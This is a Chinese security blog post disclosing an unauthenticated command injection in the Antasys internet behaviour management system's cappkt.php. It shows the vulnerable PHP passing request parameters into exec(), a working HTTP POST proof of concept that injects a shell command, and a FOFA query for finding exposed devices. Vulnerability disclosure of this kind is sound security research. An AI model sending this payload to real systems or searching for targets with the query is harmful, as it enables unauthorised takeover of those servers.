---
title: "汉塔科技上网行为管理系统 cappkt.php 命令注入漏洞"
source: https://mrxn.net/jswz/antasys-dgn_tools-cappkt-rce.html
asset_dir: assets/汉塔科技上网行为管理系统-cappkt.php-命令注入漏洞
---

# 汉塔科技上网行为管理系统 cappkt.php 命令注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/4/1 08:35
* 1128浏览
* [0评论](#comment)
* 11分钟阅读

深入探索

服务器

授权

软件开发


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

汉塔科技 - 上网行为管理系统是上海汉塔网络科技有限公司开发的一款上网行为流量管理系统。其系统 `cappkt.php` 存在[命令注入](https://mrxn.net/tag/rce)漏洞，未授权攻击者可利用此漏洞在服务器上[执行](https://mrxn.net/tag/rce)任意系统命令，造成系统失陷、敏感数据泄露等高危风险。

代码安全审计

# 影响版本

# fofa语法

> `body="Antasys"`

# 漏洞分析

> 系统比较古老，使用的是威盾PHP混淆加密，可以参考[这篇文章](https://mrxn.net/jswz/antasys-dgn_tools-tracert-rce.html)附录部分代码进行批量解密或者使用参考链接部分进行在线单个文件解密。

直接看 `dgn/dgn_tools/cappkt.php` 的业务逻辑实现关键部分

```
<?php

$itf = $_REQUEST['itf'];
$pktcnt = $_REQUEST['pktcnt'];
$txtip = $_REQUEST['txtip'];
$output = "";
$host = ($txtip ? "host $txtip" : "");
flush();
exec("kill -9 `ps -ef|grep tcpdump|grep -v grep|awk '{print $1}'`");
exec("tcpdump -i eth$itf $host -s 0 -c $pktcnt -w /www/doc/dd.pcap");
$output .= "ok";
flush();
sleep(1);
echo $output;;
echo ' 
'; ?>
```

通过 `$_REQUEST` 超全局变量获取 `itf` 、`pktcnt` 和 `txtip` 参数值后，就直接拼接进 exec函数进行[命令执行](https://mrxn.net/tag/rce)，无任何过滤，造成命令注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)。

# 漏洞复现

```
POST /dgn/dgn_tools/cappkt.php HTTP/1.1
Host: antasys.test
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.4103.116 Safari/537.36
Content-Type: application/x-www-form-urlencoded

itf=127.1;touch /tmp/xxx;%20%23%20&pktcnt=1&txtip=10
```

三个个参数均存在命令注入

漏洞预警服务

## itf

[![汉塔科技上网行为管理系统 cappkt.php 命令注入漏洞](images/img-001-cd2242f60612.webp)](https://image.mrxn.net/dc52914930274de1a58a810673f6c0f3.webp)

pktcnt 和 txtip 也是存在同样的命令注入漏洞。

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.itf](#toc-5-1-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[汉塔科技上网行为管理系统 cappkt.php 命令注入漏洞](https://mrxn.net/jswz/antasys-dgn_tools-cappkt-rce.html)  
文章链接：<https://mrxn.net/jswz/antasys-dgn_tools-cappkt-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

网络安全

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/antasys-dgn\_tools-cappkt-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/antasys-dgn\_tools-cappkt-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 